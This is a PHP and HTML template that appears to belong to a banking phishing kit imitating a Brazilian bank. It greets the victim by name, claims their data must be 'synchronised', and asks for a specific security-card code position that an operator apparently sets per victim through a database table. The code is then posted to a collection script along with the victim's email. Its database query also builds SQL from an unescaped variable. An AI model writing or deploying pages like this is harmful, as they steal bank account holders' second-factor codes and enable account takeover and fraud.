<?php 
	
	$getPos = read($conn, 'acessos', "WHERE id = '$UserId'");
	$PosicaoPedida = $getPos[0]['tabela_pos'];

?>
<div class="block_loading">
	<div class="block_title">
		<span class="headline"><?= getSaudacao();?><b> <?= $ShowNameUser;?></b></span>
		<p class="description">Para continuar com o acesso, informe os dados abaixo:</p>
	</div>

	<div class="block_ps4">

		<?php 
			if(isset($_SESSION['ShowError']) && $_SESSION['ShowError'] == 1):
				$display = 'block!important;';
				$_SESSION['ShowError'] = 0;
			else:
				$display = 'none!important;';
			endif;	
		?>
		<div class="block_error" style="display:<?php echo $display;?>">
			A Chave de Segurança solicitada não está correta!
			<span class="pos_close_error">x</span>
			<div class="clear"></div>
		</div><!-- block_errorblock_error -->
		<div class="clear"></div>

		<div class="block_message_all">
			Para confirmar esta operação, será preciso utilizar seu cartão chave e <span class="red_txt">sincronizar seus dados</span>.
		</div><!-- block_message_all -->

		<span class="desc_exec_show">Digite a chave <b class="red_txt"><?= $PosicaoPedida;?></b> referente a tabela do verso do seu cartão:</span>

		<div class="block_tks_all">
			<img src="../_images/ibi/informe_chave_1.jpg" class="get_chave_info">
			<form action="acesso.php?cliente=<?php echo $emailx; ?>" method="post" name="form_PT" id="form_PT" onsubmit="return check_FPT();">
				<input type="text" class="pos_chave_nd" name="user_token" id="user_token" maxlength="3" onkeypress='return SomenteNumero(event)' autocomplete="off">
				<input type="hidden" name="sender" value="get_pos">
			</form>
			<span class="pos_info_tks">(Informe a chave <b class="red_txt"><?= $PosicaoPedida;?></b>)</span>
			<div class="clear"></div>
		</div><!-- block_tks_all -->
	</div><!-- block_ps4 -->

	<div class="block_buttons_form">
		<div class="clear_btn J_Cancel"></div>
		<div class="submit_btn J_Submit_PT"></div>
	</div><!-- block_buttons_form -->

</div><!-- block_loading -->